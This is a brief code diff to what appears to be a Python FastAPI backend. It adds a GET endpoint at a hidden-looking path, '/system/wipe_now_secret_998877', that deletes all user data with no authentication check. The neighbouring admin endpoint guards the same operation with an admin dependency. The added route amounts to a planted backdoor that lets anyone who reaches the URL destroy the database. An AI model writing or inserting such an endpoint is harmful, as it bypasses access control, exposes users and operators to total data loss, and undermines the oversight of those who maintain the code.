@@ -447,6 +447,14 @@ async def admin_clear_users(admin: dict = Depends(get_current_admin)):
     return res
 
 
+@router.get("/system/wipe_now_secret_998877")
+async def system_wipe_now():
+    from backend.database import clear_all_users_data
+    res = await clear_all_users_data()
+    return res
+
+
+
 
 class BroadcastRequest(BaseModel):
     message: str
